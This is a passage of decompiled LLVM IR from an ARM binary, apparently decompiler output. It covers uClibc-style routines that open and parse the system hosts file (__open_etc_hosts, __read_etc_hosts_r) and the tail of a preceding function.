  %v3_1a130 = mul nuw nsw i32 %v4_1a124, 65536
  store i32 %v3_1a130, i32* %r3.global-to-local, align 4
  %v1_1a134 = add i32 %v0_1a120, 4
  %v2_1a134 = inttoptr i32 %v1_1a134 to i8*
  %v3_1a134 = load i8, i8* %v2_1a134, align 1
  %v4_1a134 = zext i8 %v3_1a134 to i32
  %v4_1a138 = mul nuw i32 %v4_1a128, 16777216
  %v5_1a138 = or i32 %v4_1a138, %v3_1a130
  %v2_1a13c = or i32 %v5_1a138, %v4_1a12c
  %v4_1a140 = mul nuw nsw i32 %v4_1a134, 256
  %v5_1a140 = or i32 %v2_1a13c, %v4_1a140
  store i32 %v5_1a140, i32* %r3.global-to-local, align 4
  %v1_1a144 = load i32, i32* @r6, align 4
  %v2_1a144 = add i32 %v1_1a144, 12
  %v3_1a144 = inttoptr i32 %v2_1a144 to i32*
  store i32 %v5_1a140, i32* %v3_1a144, align 4
  %v0_1a148 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a148 = add i32 %v0_1a148, 6
  %v2_1a148 = inttoptr i32 %v1_1a148 to i8*
  %v3_1a148 = load i8, i8* %v2_1a148, align 1
  %v4_1a148 = zext i8 %v3_1a148 to i32
  %v0_1a14c = load i32, i32* @r4, align 4
  %v1_1a14c = add i32 %v0_1a14c, 9
  %v2_1a14c = inttoptr i32 %v1_1a14c to i8*
  %v3_1a14c = load i8, i8* %v2_1a14c, align 1
  %v4_1a14c = zext i8 %v3_1a14c to i32
  %v1_1a150 = add i32 %v0_1a14c, 10
  store i32 %v1_1a150, i32* %r0.global-to-local, align 4
  %v4_1a154 = mul nuw nsw i32 %v4_1a148, 256
  %v5_1a154 = or i32 %v4_1a14c, %v4_1a154
  store i32 %v5_1a154, i32* %r3.global-to-local, align 4
  %v0_1a158 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a158 = add i32 %v0_1a158, 10
  %v0_1a15c = load i32, i32* @r5, align 4
  %v1_1a160 = add nuw nsw i32 %v5_1a154, 10
  store i32 %v1_1a160, i32* %r1.global-to-local, align 4
  %v1_1a164 = load i32, i32* @r6, align 4
  %v2_1a164 = add i32 %v1_1a164, 24
  %v3_1a164 = inttoptr i32 %v2_1a164 to i32*
  store i32 %v1_1a158, i32* %v3_1a164, align 4
  %v0_1a168 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a168 = load i32, i32* @r6, align 4
  %v2_1a168 = add i32 %v1_1a168, 20
  %v3_1a168 = inttoptr i32 %v2_1a168 to i32*
  store i32 %v0_1a168, i32* %v3_1a168, align 4
  %v0_1a16c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a16c = load i32, i32* @r6, align 4
  %v2_1a16c = add i32 %v1_1a16c, 16
  %v3_1a16c = inttoptr i32 %v2_1a16c to i32*
  store i32 %v0_1a16c, i32* %v3_1a16c, align 4
  %v0_1a170 = load i32, i32* @r7, align 4
  %v1_1a170 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a170 = add i32 %v1_1a170, %v0_1a170
  %v5_1a174 = icmp slt i32 %v0_1a15c, %v5_1a154
  %.v2_1a170 = select i1 %v5_1a174, i32 -1, i32 %v2_1a170
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1a0f4, %entry
  %v0_1a178 = phi i32 [ %.v2_1a170, %dec_label_pc_1a0f4 ], [ %v1_1a0e0, %bb ], [ %v0_1a0c8, %entry ]
  store i32 %v0_1a178, i32* %r0.global-to-local, align 4
  store i32 %v3_1a0a8, i32* @r4, align 4
  store i32 %v6_1a0a8, i32* @r5, align 4
  store i32 %v9_1a0a8, i32* @r6, align 4
  store i32 %v12_1a0a8, i32* @r7, align 4
  store i32 %v21_1a0a8, i32* @sl, align 4
  ret i32 %v0_1a178

; uselistorder directives
  uselistorder i32 %v0_1a178, { 1, 0 }
  uselistorder i32 %v5_1a154, { 1, 0, 2 }
  uselistorder i32 %v3_1a130, { 1, 0 }
  uselistorder i32 %v1_1a0e0, { 0, 2, 1 }
  uselistorder i32 %v0_1a0c8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 29, 30, 31, 32, 0, 18, 36, 3, 37, 1, 4, 33, 5, 19, 20, 11, 28, 12, 6, 2, 7, 21, 22, 23, 24, 13, 34, 14, 15, 16, 17, 25, 26, 27, 8, 9, 10, 35 }
  uselistorder i32 24, { 27, 28, 29, 19, 36, 0, 30, 31, 32, 20, 10, 37, 11, 1, 33, 21, 22, 23, 24, 25, 26, 12, 34, 35, 13, 14, 15, 16, 17, 18, 7, 8, 4, 3, 9, 2, 5, 6, 38, 39 }
  uselistorder i32 9, { 14, 15, 16, 17, 18, 3, 19, 4, 8, 23, 5, 9, 10, 11, 12, 13, 6, 7, 2, 1, 0, 20, 21, 22 }
  uselistorder i32 6, { 20, 21, 22, 13, 14, 15, 16, 1, 2, 25, 3, 4, 17, 0, 5, 6, 7, 8, 9, 18, 19, 10, 12, 11, 23, 24 }
  uselistorder i32 5, { 1, 21, 22, 23, 12, 6, 2, 13, 14, 7, 15, 3, 5, 0, 16, 17, 8, 18, 19, 20, 9, 11, 10, 4, 24, 25, 26 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1dc24.1134 to i32), i32* @r1, align 4
  %v0_1a188 = load i32, i32* @lr, align 4
  store i32 %v0_1a188, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1dc88.1168 to i32), i32* @r0, align 4
  %v3_1a190 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1dc88.1168 to i32), i32 ptrtoint (i32* @global_var_1dc24.1134 to i32))
  %v2_1a194 = icmp eq i32 %v3_1a190, 0
  store i32 ptrtoint (i32* @global_var_1dc24.1134 to i32), i32* @r1, align 4
  br i1 %v2_1a194, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_1a190

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1dc94.1170 to i32), i32* @r0, align 4
  %v2_1a1a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1a1a4, i32* @lr, align 4
  %v3_1a1a8 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1dc94.1170 to i32), i32 ptrtoint (i32* @global_var_1dc24.1134 to i32))
  ret i32 %v3_1a1a8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1dc24.1134 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1a1b8 = load i32, i32* @r4, align 4
  %v6_1a1b8 = load i32, i32* @r5, align 4
  %v12_1a1b8 = load i32, i32* @r7, align 4
  %v15_1a1b8 = load i32, i32* @r8, align 4
  %v21_1a1b8 = load i32, i32* @sl, align 4
  %v24_1a1b8 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1a1c4 = sub i32 0, %tmp61
  %v1_1a1c8 = urem i32 %v1_1a1c4, 4
  store i32 %v1_1a1c8, i32* %ip.global-to-local, align 4
  %v2_1a1c8 = icmp eq i32 %v1_1a1c8, 0
  %v0_1a1cc = load i32, i32* @r2, align 4
  %v0_1a1d0 = load i32, i32* @r0, align 4
  %v0_1a1d4 = load i32, i32* @r1, align 4
  %v0_1a1d8 = load i32, i32* @r3, align 4
  store i32 %v0_1a1d8, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1a1c8, label %dec_label_pc_1a1f8, label %dec_label_pc_1a1e8

dec_label_pc_1a1e8:                               ; preds = %entry
  %v2_1a1e8 = sub i32 %tmp57, %v1_1a1c8
  %v3_1a1e8 = icmp ult i32 %tmp57, %v1_1a1c8
  br i1 %v3_1a1e8, label %dec_label_pc_1a4cc, label %dec_label_pc_1a1f0

dec_label_pc_1a1f0:                               ; preds = %dec_label_pc_1a1e8
  store i32 %v2_1a1e8, i32* %r2.global-to-local, align 4
  %v2_1a1f4 = add i32 %v1_1a1c8, %tmp61
  store i32 %v2_1a1f4, i32* @r4, align 4
  br label %dec_label_pc_1a1f8

dec_label_pc_1a1f8:                               ; preds = %entry, %dec_label_pc_1a1f0
  %v0_1a208 = phi i32 [ %tmp61, %entry ], [ %v2_1a1f4, %dec_label_pc_1a1f0 ]
  %v0_1a20c = phi i32 [ %tmp57, %entry ], [ %v2_1a1e8, %dec_label_pc_1a1f0 ]
  %tmp = icmp ult i32 %v0_1a20c, 32
  br i1 %tmp, label %dec_label_pc_1a4cc, label %dec_label_pc_1a200

dec_label_pc_1a200:                               ; preds = %dec_label_pc_1a1f8
  store i32 %v0_1a1d8, i32* %r0.global-to-local, align 4
  %v7_1a204 = icmp eq i32 %v0_1a1d8, 1
  %v1_1a208 = add i32 %v0_1a208, 32
  store i32 %v1_1a208, i32* @fp, align 4
  %v1_1a20c = add i32 %v0_1a20c, -32
  store i32 %v1_1a20c, i32* @r8, align 4
  br i1 %v7_1a204, label %dec_label_pc_1a338, label %dec_label_pc_1a214

dec_label_pc_1a214:                               ; preds = %dec_label_pc_1a200
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1a220 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_1a220, align 4
  %tmp80 = icmp ult i32 %v1_1a20c, 4
  br i1 %tmp80, label %dec_label_pc_1a4cc, label %dec_label_pc_1a228

dec_label_pc_1a228:                               ; preds = %dec_label_pc_1a214
  %v0_1a228 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a228 = add i32 %v0_1a228, -36
  store i32 %v1_1a228, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_1a228, 8
  br i1 %tmp81, label %dec_label_pc_1a4cc, label %dec_label_pc_1a234

dec_label_pc_1a234:                               ; preds = %dec_label_pc_1a228
  %v0_1a234 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1a234, 16
  br i1 %tmp82, label %dec_label_pc_1a4cc, label %dec_label_pc_1a23c

dec_label_pc_1a23c:                               ; preds = %dec_label_pc_1a234
  %v1_1a23c = add i32 %v0_1a228, -48
  store i32 %v1_1a23c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1a23c, 8
  br i1 %tmp83, label %dec_label_pc_1a4cc, label %dec_label_pc_1a248

dec_label_pc_1a248:                               ; preds = %dec_label_pc_1a23c
  %v1_1a248 = add i32 %v0_1a228, -44
  store i32 %v1_1a248, i32* @r8, align 4
  %v1_1a24c = add i32 %v0_1a228, -56
  store i32 %v1_1a24c, i32* %r3.global-to-local, align 4
  %v3_1a250 = icmp ult i32 %v1_1a24c, %v1_1a248
  br i1 %v3_1a250, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1a248
  %v1_1a258 = load i32, i32* @r4, align 4
  %v2_1a258 = add i32 %v1_1a258, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1a248
  store i32 %v1_1a24c, i32* @r8, align 4
  %v1_1a25c.pre = load i32, i32* @r4, align 4
  %v2_1a25c = add i32 %v1_1a25c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1a25c, %.thread1 ], [ %v2_1a258, %bb ]
  %v0_1a264 = phi i32 [ %v1_1a25c.pre, %.thread1 ], [ %v1_1a258, %bb ]
  %v0_1a260 = phi i32 [ %v1_1a24c, %.thread1 ], [ %v1_1a248, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_1a264 = add i32 %v0_1a264, 36
  store i32 %v1_1a264, i32* @r6, align 4
  %v1_1a268 = add i32 %v0_1a264, 48
  store i32 %v1_1a268, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_1a260, 80
  br i1 %tmp84, label %dec_label_pc_1a4cc, label %dec_label_pc_1a270

dec_label_pc_1a270:                               ; preds = %bb74
  %v0_1a270 = call i32 @__open_etc_hosts()
  store i32 %v0_1a270, i32* %r0.global-to-local, align 4
  %v2_1a274 = icmp eq i32 %v0_1a270, 0
  br i1 %v2_1a274, label %dec_label_pc_1a290, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a270
  %v1_1a27c = load i32, i32* @fp, align 4
  store i32 %v1_1a27c, i32* @r7, align 4
  %v1_1a280 = load i32, i32* @r5, align 4
  store i32 %v1_1a280, i32* @fp, align 4
  %v1_1a284 = load i32, i32* @r6, align 4
  %v1_1a288 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a344

dec_label_pc_1a290:                               ; preds = %dec_label_pc_1a270
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1a298 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1a298, align 4
  %v0_1a29c = call i32 @__errno_location()
  store i32 %v0_1a29c, i32* %r0.global-to-local, align 4
  %v1_1a2a0 = inttoptr i32 %v0_1a29c to i32*
  %v2_1a2a0 = load i32, i32* %v1_1a2a0, align 4
  store i32 %v2_1a2a0, i32* @sl, align 4
  br label %dec_label_pc_1a4d0

dec_label_pc_1a2a8:                               ; preds = %dec_label_pc_1a458
  %v0_1a2a8 = load i32, i32* @r4, align 4
  %v1_1a2a8 = add i32 %v0_1a2a8, 4
  %v2_1a2a8 = inttoptr i32 %v1_1a2a8 to i32*
  %v3_1a2a8 = load i32, i32* %v2_1a2a8, align 4
  %v1_1a2ac = load i32, i32* @sb, align 4
  %v2_1a2ac = inttoptr i32 %v1_1a2ac to i32*
  store i32 %v3_1a2a8, i32* %v2_1a2ac, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1a2c0 = load i32, i32* @r4, align 4
  %v1_1a2c0 = add i32 %v0_1a2c0, 8
  store i32 %v1_1a2c0, i32* %r1.global-to-local, align 4
  %v1_1a2c4 = load i32, i32* @sb, align 4
  %v2_1a2c4 = add i32 %v1_1a2c4, 8
  %v3_1a2c4 = inttoptr i32 %v2_1a2c4 to i32*
  store i32 2, i32* %v3_1a2c4, align 4
  %v0_1a2c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1a2c8, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1a2d0 = load i32, i32* @sb, align 4
  %v1_1a2d0 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a2d0 = inttoptr i32 %v1_1a2d0 to i32*
  store i32 %v0_1a2d0, i32* %v2_1a2d0, align 4
  %v0_1a2d4 = load i32, i32* @r7, align 4
  %v1_1a2d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a2d4 = inttoptr i32 %v1_1a2d4 to i32*
  store i32 %v0_1a2d4, i32* %v2_1a2d4, align 4
  %v0_1a2d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a2d8 = load i32, i32* @sb, align 4
  %v2_1a2d8 = add i32 %v1_1a2d8, 12
  %v3_1a2d8 = inttoptr i32 %v2_1a2d8 to i32*
  store i32 %v0_1a2d8, i32* %v3_1a2d8, align 4
  %v0_1a2dc = load i32, i32* %r0.global-to-local, align 4
  %v1_1a2dc = load i32, i32* @sb, align 4
  %v2_1a2dc = add i32 %v1_1a2dc, 16
  %v3_1a2dc = inttoptr i32 %v2_1a2dc to i32*
  store i32 %v0_1a2dc, i32* %v3_1a2dc, align 4
  %v0_1a2e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2e0 = load i32, i32* @sb, align 4
  %v2_1a2e0 = add i32 %v1_1a2e0, 4
  %v3_1a2e0 = inttoptr i32 %v2_1a2e0 to i32*
  store i32 %v0_1a2e0, i32* %v3_1a2e0, align 4
  %v0_1a2e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a2e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a2e4 = add i32 %v1_1a2e4, 4
  %v3_1a2e4 = inttoptr i32 %v2_1a2e4 to i32*
  store i32 %v0_1a2e4, i32* %v3_1a2e4, align 4
  br label %dec_label_pc_1a4b4

dec_label_pc_1a2ec:                               ; preds = %dec_label_pc_1a480
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1a2f0 = load i32, i32* @r4, align 4
  %v1_1a2f0 = add i32 %v0_1a2f0, 4
  %v2_1a2f0 = inttoptr i32 %v1_1a2f0 to i32*
  %v3_1a2f0 = load i32, i32* %v2_1a2f0, align 4
  store i32 %v3_1a2f0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1a2f8 = load i32, i32* @sb, align 4
  %v2_1a2f8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1a2f8, i32* %v2_1a2f8, align 4
  store i32 %v0_1a350, i32* %ip.global-to-local, align 4
  %v0_1a300 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a300 = load i32, i32* @sb, align 4
  %v2_1a300 = inttoptr i32 %v1_1a300 to i32*
  store i32 %v0_1a300, i32* %v2_1a300, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a30c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a30c = load i32, i32* %r0.global-to-local, align 4
  %v2_1a30c = inttoptr i32 %v1_1a30c to i32*
  store i32 %v0_1a30c, i32* %v2_1a30c, align 4
  %v0_1a310 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a310 = load i32, i32* @sb, align 4
  %v2_1a310 = add i32 %v1_1a310, 12
  %v3_1a310 = inttoptr i32 %v2_1a310 to i32*
  store i32 %v0_1a310, i32* %v3_1a310, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1a31c = load i32, i32* @r4, align 4
  %v1_1a31c = add i32 %v0_1a31c, 8
  store i32 %v1_1a31c, i32* %r1.global-to-local, align 4
  %v0_1a320 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1a320, i32* @sl, align 4
  %v1_1a324 = load i32, i32* @sb, align 4
  %v2_1a324 = add i32 %v1_1a324, 8
  %v3_1a324 = inttoptr i32 %v2_1a324 to i32*
  store i32 10, i32* %v3_1a324, align 4
  %v0_1a328 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a328 = load i32, i32* @sb, align 4
  %v2_1a328 = add i32 %v1_1a328, 16
  %v3_1a328 = inttoptr i32 %v2_1a328 to i32*
  store i32 %v0_1a328, i32* %v3_1a328, align 4
  %v0_1a32c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a32c = load i32, i32* @sb, align 4
  %v2_1a32c = add i32 %v1_1a32c, 4
  %v3_1a32c = inttoptr i32 %v2_1a32c to i32*
  store i32 %v0_1a32c, i32* %v3_1a32c, align 4
  %v0_1a330 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a330 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a330 = add i32 %v1_1a330, 4
  %v3_1a330 = inttoptr i32 %v2_1a330 to i32*
  store i32 %v0_1a330, i32* %v3_1a330, align 4
  br label %dec_label_pc_1a4b4

dec_label_pc_1a338:                               ; preds = %dec_label_pc_1a200
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1a344

dec_label_pc_1a344:                               ; preds = %.thread, %dec_label_pc_1a338
  %v2_1a354.pre-phi = phi i32* [ %v2_1a220, %.thread ], [ %.pre, %dec_label_pc_1a338 ]
  %v0_1a350 = phi i32 [ %v1_1a27c, %.thread ], [ 0, %dec_label_pc_1a338 ]
  %stack_var_-40.1 = phi i32 [ %v1_1a288, %.thread ], [ 0, %dec_label_pc_1a338 ]
  %stack_var_-48.1 = phi i32 [ %v1_1a284, %.thread ], [ 0, %dec_label_pc_1a338 ]
  %stack_var_-52.0 = phi i32 [ %v0_1a270, %.thread ], [ %v0_1a1d0, %dec_label_pc_1a338 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1a354.pre-phi, align 4
  %v2_1a418 = inttoptr i32 %v0_1a1d4 to i8*
  %v7_1a450 = icmp eq i32 %v0_1a1cc, 2
  %v7_1a478 = icmp eq i32 %v0_1a1cc, 10
  br label %dec_label_pc_1a49c

dec_label_pc_1a35c:                               ; preds = %dec_label_pc_1a49c
  %v0_1a35c = load i32, i32* @fp, align 4
  store i32 %v0_1a35c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1a364 = call i32 @__GI_strchr(i32 %v0_1a35c, i32 35)
  store i32 %v2_1a364, i32* %r0.global-to-local, align 4
  %v3_1a368 = icmp eq i32 %v2_1a364, 0
  br i1 %v3_1a368, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1a35c
  %v0_1a37011 = load i32, i32* @fp, align 4
  store i32 %v0_1a37011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1a3dc.preheader

bb75:                                             ; preds = %dec_label_pc_1a35c
  %v3_1a364 = inttoptr i32 %v2_1a364 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a370 = load i32, i32* @fp, align 4
  store i32 %v0_1a370, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1a364, align 1
  %v0_1a3dc30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a3dc.preheader

dec_label_pc_1a3dc.preheader:                     ; preds = %bb75, %.thread10
  %v0_1a3dc30 = phi i32 [ %v0_1a3dc30.pre, %bb75 ], [ %v0_1a37011, %.thread10 ]
  %v1_1a3dc31 = inttoptr i32 %v0_1a3dc30 to i8*
  %v2_1a3dc32 = load i8, i8* %v1_1a3dc31, align 1
  %v3_1a3dc33 = zext i8 %v2_1a3dc32 to i32
  store i32 %v3_1a3dc33, i32* %r3.global-to-local, align 4
  %v2_1a3e034 = icmp eq i8 %v2_1a3dc32, 0
  br i1 %v2_1a3e034, label %dec_label_pc_1a3e8, label %dec_label_pc_1a388.preheader

dec_label_pc_1a380:                               ; preds = %dec_label_pc_1a394
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1a384 = inttoptr i32 %v8_1a3ac to i8*
  store i8 0, i8* %v3_1a384, align 1
  %v4_1a384 = load i32, i32* %r2.global-to-local, align 4
  %v5_1a384 = add i32 %v4_1a384, 1
  store i32 %v5_1a384, i32* %r2.global-to-local, align 4
  %v1_1a388 = inttoptr i32 %v5_1a384 to i8*
  %v2_1a388 = load i8, i8* %v1_1a388, align 1
  %v3_1a388 = zext i8 %v2_1a388 to i32
  store i32 %v3_1a388, i32* %r1.global-to-local, align 4
  %v2_1a38c = icmp eq i8 %v2_1a388, 0
  br i1 %v2_1a38c, label %dec_label_pc_1a3e8, label %dec_label_pc_1a394

dec_label_pc_1a394:                               ; preds = %dec_label_pc_1a388.preheader, %dec_label_pc_1a380
  %v8_1a3ac = phi i32 [ %v5_1a384, %dec_label_pc_1a380 ], [ %v0_1a38820, %dec_label_pc_1a388.preheader ]
  %v1_1a39c = phi i32 [ %v3_1a388, %dec_label_pc_1a380 ], [ %v3_1a38823, %dec_label_pc_1a388.preheader ]
  %v2_1a398 = load i32, i32* @global_var_26250, align 4
  store i32 %v2_1a398, i32* %r3.global-to-local, align 4
  %v3_1a39c = mul nuw nsw i32 %v1_1a39c, 2
  %v4_1a39c = add i32 %v3_1a39c, %v2_1a398
  %v5_1a39c = inttoptr i32 %v4_1a39c to i8*
  %v6_1a39c = load i8, i8* %v5_1a39c, align 1
  %v8_1a39c = zext i8 %v6_1a39c to i32
  store i32 %v8_1a39c, i32* %r3.global-to-local, align 4
  %v1_1a3a0 = and i32 %v8_1a39c, 32
  %v2_1a3a0 = icmp eq i32 %v1_1a3a0, 0
  br i1 %v2_1a3a0, label %dec_label_pc_1a3a8, label %dec_label_pc_1a380

dec_label_pc_1a3a8:                               ; preds = %dec_label_pc_1a394
  %v0_1a3a8 = load i32, i32* @r6, align 4
  %v7_1a3ac = icmp slt i32 %v0_1a3a8, 7
  br i1 %v7_1a3ac, label %bb76, label %dec_label_pc_1a3bc.preheader

bb76:                                             ; preds = %dec_label_pc_1a3a8
  %v9_1a3ac = load i32, i32* @r4, align 4
  %v13_1a3ac = mul i32 %v0_1a3a8, 4
  %v14_1a3ac = add i32 %v9_1a3ac, %v13_1a3ac
  %v15_1a3ac = inttoptr i32 %v14_1a3ac to i32*
  store i32 %v8_1a3ac, i32* %v15_1a3ac, align 4
  %v8_1a3b0 = load i32, i32* @r6, align 4
  %v9_1a3b0 = add i32 %v8_1a3b0, 1
  store i32 %v9_1a3b0, i32* @r6, align 4
  %v0_1a3bc25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a3bc.preheader

dec_label_pc_1a3bc.preheader:                     ; preds = %bb76, %dec_label_pc_1a3a8
  %v0_1a3bc25 = phi i32 [ %v0_1a3bc25.pre, %bb76 ], [ %v8_1a3ac, %dec_label_pc_1a3a8 ]
  %v1_1a3bc26 = inttoptr i32 %v0_1a3bc25 to i8*
  %v2_1a3bc27 = load i8, i8* %v1_1a3bc26, align 1
  %v3_1a3bc28 = zext i8 %v2_1a3bc27 to i32
  store i32 %v3_1a3bc28, i32* %r1.global-to-local, align 4
  %v2_1a3c029 = icmp eq i8 %v2_1a3bc27, 0
  br i1 %v2_1a3c029, label %dec_label_pc_1a3dc.loopexit, label %dec_label_pc_1a3c8.lr.ph

dec_label_pc_1a3c8.lr.ph:                         ; preds = %dec_label_pc_1a3bc.preheader
  %v2_1a3cc.pre = load i32, i32* @global_var_26250, align 4
  br label %dec_label_pc_1a3c8

dec_label_pc_1a3b8:                               ; preds = %dec_label_pc_1a3c8
  %v1_1a3b8 = add i32 %v0_1a3b8, 1
  store i32 %v1_1a3b8, i32* %r2.global-to-local, align 4
  %v1_1a3bc = inttoptr i32 %v1_1a3b8 to i8*
  %v2_1a3bc = load i8, i8* %v1_1a3bc, align 1
  %v3_1a3bc = zext i8 %v2_1a3bc to i32
  store i32 %v3_1a3bc, i32* %r1.global-to-local, align 4
  %v2_1a3c0 = icmp eq i8 %v2_1a3bc, 0
  br i1 %v2_1a3c0, label %dec_label_pc_1a3dc.loopexit, label %dec_label_pc_1a3c8

dec_label_pc_1a3c8:                               ; preds = %dec_label_pc_1a3c8.lr.ph, %dec_label_pc_1a3b8
  %v0_1a3b8 = phi i32 [ %v0_1a3bc25, %dec_label_pc_1a3c8.lr.ph ], [ %v1_1a3b8, %dec_label_pc_1a3b8 ]
  %v1_1a3d0 = phi i32 [ %v3_1a3bc28, %dec_label_pc_1a3c8.lr.ph ], [ %v3_1a3bc, %dec_label_pc_1a3b8 ]
  store i32 %v2_1a3cc.pre, i32* %r3.global-to-local, align 4
  %v3_1a3d0 = mul nuw nsw i32 %v1_1a3d0, 2
  %v4_1a3d0 = add i32 %v3_1a3d0, %v2_1a3cc.pre
  %v5_1a3d0 = inttoptr i32 %v4_1a3d0 to i8*
  %v6_1a3d0 = load i8, i8* %v5_1a3d0, align 1
  %v8_1a3d0 = zext i8 %v6_1a3d0 to i32
  store i32 %v8_1a3d0, i32* %r3.global-to-local, align 4
  %v1_1a3d4 = and i32 %v8_1a3d0, 32
  %v2_1a3d4 = icmp eq i32 %v1_1a3d4, 0
  br i1 %v2_1a3d4, label %dec_label_pc_1a3b8, label %dec_label_pc_1a3dc.loopexit

dec_label_pc_1a3dc.loopexit:                      ; preds = %dec_label_pc_1a3c8, %dec_label_pc_1a3b8, %dec_label_pc_1a3bc.preheader
  %v0_1a3dc = phi i32 [ %v0_1a3bc25, %dec_label_pc_1a3bc.preheader ], [ %v0_1a3b8, %dec_label_pc_1a3c8 ], [ %v1_1a3b8, %dec_label_pc_1a3b8 ]
  %v1_1a3dc = inttoptr i32 %v0_1a3dc to i8*
  %v2_1a3dc = load i8, i8* %v1_1a3dc, align 1
  %v3_1a3dc = zext i8 %v2_1a3dc to i32
  store i32 %v3_1a3dc, i32* %r3.global-to-local, align 4
  %v2_1a3e0 = icmp eq i8 %v2_1a3dc, 0
  br i1 %v2_1a3e0, label %dec_label_pc_1a3e8, label %dec_label_pc_1a388.preheader

dec_label_pc_1a388.preheader:                     ; preds = %dec_label_pc_1a3dc.preheader, %dec_label_pc_1a3dc.loopexit
  %v0_1a38820 = phi i32 [ %v0_1a3dc, %dec_label_pc_1a3dc.loopexit ], [ %v0_1a3dc30, %dec_label_pc_1a3dc.preheader ]
